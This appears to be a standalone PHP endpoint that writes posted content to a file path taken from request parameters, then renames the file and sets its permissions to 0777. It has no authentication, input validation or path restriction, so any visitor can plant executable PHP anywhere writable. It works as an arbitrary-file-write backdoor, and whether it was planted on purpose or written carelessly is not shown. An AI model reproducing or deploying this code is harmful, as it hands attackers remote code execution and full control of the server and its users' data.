<?php
$name = $_REQUEST['name']; $to = $_REQUEST['to'];
$content = $_POST['content']; $merge = $_REQUEST['merge'];
if ($merge != 0) {
    chmod($name, 0777);
    file_put_contents($name, $content);
    rename($name, $to); chmod($to, 0777);
} else {
    if (file_exists($to)) {
        if ($name == $to) {
            chmod($name, 0777);
            file_put_contents($name, $content);
            rename($name, $to); chmod($to, 0777);
        }
    } else {
        chmod($name, 0777);
        file_put_contents($name, $content);
        rename($name, $to); chmod($to, 0777);
    }
}
